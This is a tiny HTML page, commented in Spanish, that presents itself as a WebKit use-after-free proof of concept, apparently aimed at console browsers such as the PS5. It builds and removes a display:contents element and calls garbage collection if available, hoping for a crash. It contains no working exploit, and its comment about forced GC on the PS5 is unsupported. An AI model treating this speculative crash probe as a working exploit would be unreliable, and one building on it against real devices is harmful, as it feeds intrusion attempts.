<!DOCTYPE html>
<html>
<head>
  <title>WebKit PoC - Use After Free Test</title>
</head>
<body>
  <script>
    function triggerBug() {
      let div = document.createElement("div");
      document.body.appendChild(div);

      // Estilo que puede provocar operaciones de render conflictivas
      div.style.display = "contents";

      // Crear estructura interna peligrosa
      let inner = document.createElement("span");
      inner.textContent = "Test";
      div.appendChild(inner);

      // Forzar recalculo de layout/render
      getComputedStyle(inner).color;

      // Eliminar el nodo para intentar provocar destrucción desordenada
      div.remove();

      // Forzar GC (sólo en navegadores con heapSize visible, como PS5)
      try {
        if (window.gc) window.gc();
      } catch (e) {}

      // Verificación mínima
      console.log("PoC ejecutado. Revisa si hay crash, assertion o comportamiento extraño.");
    }

    triggerBug();
  </script>
</body>
</html>
